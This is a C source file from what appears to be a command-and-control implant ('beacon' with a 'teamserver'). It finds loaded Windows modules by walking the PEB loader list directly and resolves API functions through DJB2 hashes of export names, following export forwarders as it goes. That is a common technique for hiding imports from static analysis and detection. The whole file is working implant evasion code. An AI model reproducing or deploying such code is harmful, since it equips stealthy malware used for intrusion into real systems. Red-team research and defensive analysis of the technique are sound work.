/* beacon/src/resolve/resolve.c */
#include <windows.h>
#include <string.h>
#include "resolve.h"
#include "dynapi.h"

/* DJB2 — must match hashgen.DJB2 in teamserver/hashgen/hashgen.go exactly. */
static DWORD djb2(const char *s) {
    DWORD h = 5381;
    while (*s)
        h = h * 33 ^ (unsigned char)*s++;
    return h;
}

/*
 * Minimal inline structs for PEB/LDR access.
 * Defined here to avoid winternl.h variation across MinGW versions.
 *
 * x64 offsets verified against Windows 10+ SDK documentation:
 *   PEB.Ldr                    @ 0x18
 *   PEB_LDR_DATA.InLoadOrderModuleList @ 0x10
 *   LDR_DATA_TABLE_ENTRY.DllBase       @ 0x30
 *   LDR_DATA_TABLE_ENTRY.BaseDllName   @ 0x58 (UNICODE_STRING)
 *   UNICODE_STRING.Buffer              @ +8 within the struct
 */

HMODULE peb_get_module(const wchar_t *name) {
    PVOID peb;
    /* Read PEB address from GS:[0x60] — x64 TEB.ProcessEnvironmentBlock */
    __asm__ volatile ("movq %%gs:0x60, %0" : "=r"(peb));

    PVOID     ldr  = *(PVOID     *)((BYTE *)peb  + 0x18); /* PEB->Ldr */
    LIST_ENTRY *head = (LIST_ENTRY *)((BYTE *)ldr  + 0x10); /* Ldr->InLoadOrderModuleList */

    for (LIST_ENTRY *e = head->Flink; e != head; e = e->Flink) {
        PVOID   base = *(PVOID   *)((BYTE *)e + 0x30); /* DllBase */
        USHORT  blen = *(USHORT  *)((BYTE *)e + 0x58); /* BaseDllName.Length (bytes) */
        PWSTR   buf  = *(PWSTR   *)((BYTE *)e + 0x60); /* BaseDllName.Buffer */

        if (!buf || blen == 0) continue;
        USHORT wlen = blen / sizeof(WCHAR);
        if ((size_t)wlen == wcslen(name) && _wcsnicmp(buf, name, wlen) == 0)
            return (HMODULE)base;
    }
    return NULL;
}

FARPROC resolve_hash(HMODULE hMod, DWORD hash) {
    if (!hMod) return NULL;

    BYTE *base = (BYTE *)hMod;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    DWORD exp_rva = nt->OptionalHeader
                      .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
                      .VirtualAddress;
    if (!exp_rva) return NULL;

    DWORD exp_size = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)(base + exp_rva);
    DWORD *names = (DWORD *)(base + exp->AddressOfNames);
    WORD  *ords  = (WORD  *)(base + exp->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD *)(base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char *fname = (const char *)(base + names[i]);
        if (djb2(fname) == hash) {
            DWORD fn_rva = funcs[ords[i]];
            if (fn_rva >= exp_rva && fn_rva < exp_rva + exp_size) {
                /* Forwarder string: "DLLNAME.FunctionName" (no .dll suffix).
                   On Windows 10+, most kernel32 exports forward to KERNELBASE.
                   Use resolved fn pointers when available, PEB walk as fallback. */
                const char *fwd = (const char *)(base + fn_rva);
                const char *dot = fwd;
                while (*dot && *dot != '.') dot++;
                if (!*dot) continue;
                char dll_name[64];
                DWORD prefix_len = (DWORD)(dot - fwd);
                if (prefix_len >= 60) continue;
                memcpy(dll_name, fwd, prefix_len);
                memcpy(dll_name + prefix_len, ".dll", 5);
                HMODULE hFwd = NULL;
                if (fnGetModuleHandleA)
                    hFwd = fnGetModuleHandleA(dll_name);
                if (!hFwd && fnLoadLibraryA)
                    hFwd = fnLoadLibraryA(dll_name);
                if (!hFwd) {
                    wchar_t wdll[64];
                    int k;
                    for (k = 0; dll_name[k] && k < 63; k++)
                        wdll[k] = (wchar_t)(unsigned char)dll_name[k];
                    wdll[k] = L'\0';
                    hFwd = peb_get_module(wdll);
                }
                if (!hFwd) continue;
                return resolve_hash(hFwd, djb2(dot + 1));
            }
            return (FARPROC)(base + fn_rva);
        }
    }
    return NULL;
}
